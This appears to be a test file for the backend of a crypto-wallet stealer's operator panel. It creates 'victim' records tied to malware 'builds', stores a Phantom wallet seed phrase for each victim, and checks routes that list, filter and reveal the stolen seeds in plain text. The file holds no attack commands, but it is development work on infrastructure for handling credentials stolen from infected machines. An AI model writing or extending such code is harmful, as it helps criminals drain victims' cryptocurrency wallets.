import { after, before, test } from 'node:test';
import assert from 'node:assert/strict';
import { randomUUID } from 'node:crypto';
import type { FastifyInstance } from 'fastify';
import { prisma } from '../server/lib/db';
import { randomToken, sha256hex } from '../server/lib/crypto';
import { upsertSecrets, upsertWallets } from '../server/services/vault';

let app: FastifyInstance;
let victimId = '';
let walletId = '';
const seed = 'abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about';

before(async () => {
  const Fastify = (await import('fastify')).default;
  const { vaultRoutes } = await import('../server/routes/vault');
  const { ZodError } = await import('zod');
  const { HttpError } = await import('../server/lib/errors');
  app = Fastify();
  app.setErrorHandler((error, _request, reply) => {
    const status = error instanceof ZodError ? 422 : error instanceof HttpError ? error.status : 500;
    return reply.code(status).send({ error: 'request_error', message: error.message });
  });
  await app.register(vaultRoutes);

  const build = await prisma.build.create({
    data: { name: `vault-api-${randomUUID()}`, version: '0.0.0', buildId: randomUUID(), tokenHash: sha256hex(randomToken(32)), secret: randomToken(32), config: {} }
  });
  const victim = await prisma.victim.create({
    data: { buildId: build.id, hostname: `vault-api-${randomUUID().slice(0, 8)}`, os: 'windows', username: 'api', deviceTokenEnc: 'v1.00.00.00' }
  });
  victimId = victim.id;
  const wallets = await upsertWallets(victimId, [{ targetId: 'phantom', kind: 'extension', path: 'C:\\Users\\api\\phantom', state: 'locked' }]);
  walletId = wallets[0]!.id;
  await upsertSecrets(victimId, [{ walletId, kind: 'bip39-24', value: seed, words: 24 }]);
});

test('the vault listing masks secrets and groups by target', async () => {
  const response = await app.inject({ method: 'GET', url: `/victims/${victimId}/vault` });
  assert.equal(response.statusCode, 200);
  const body = response.json() as { groups: Array<{ targetId: string; wallets: Array<{ secrets: Array<Record<string, unknown>> }> }> };
  assert.equal(body.groups[0]!.targetId, 'phantom');
  const secret = body.groups[0]!.wallets[0]!.secrets[0]!;
  assert.equal(secret.value, undefined);
  assert.equal(secret.valueEnc, undefined);
  assert.match(String(secret.preview), /abandon/);
});

test('reveal returns the plain value with no-store and writes an audit row', async () => {
  const before = await prisma.auditLog.count({ where: { action: 'vault.reveal' } });
  const response = await app.inject({ method: 'GET', url: `/vault/wallets/${walletId}/reveal?kind=seed` });
  assert.equal(response.statusCode, 200);
  assert.equal(response.headers['cache-control'], 'no-store');
  assert.equal((response.json() as { value: string }).value, seed);
  const after = await prisma.auditLog.count({ where: { action: 'vault.reveal' } });
  assert.ok(after > before);
});

test('the global vault accepts empty filters and returns a chain', async () => {
  const response = await app.inject({ method: 'GET', url: '/vault?q=&chain=&state=&balance=' });
  assert.equal(response.statusCode, 200);
  const body = response.json() as { groups: Array<{ chain: string }> };
  assert.equal(body.groups[0]!.chain, 'sol');
});

after(async () => {
  await app.close();
  await prisma.victim.delete({ where: { id: victimId } }).catch(() => undefined);
});
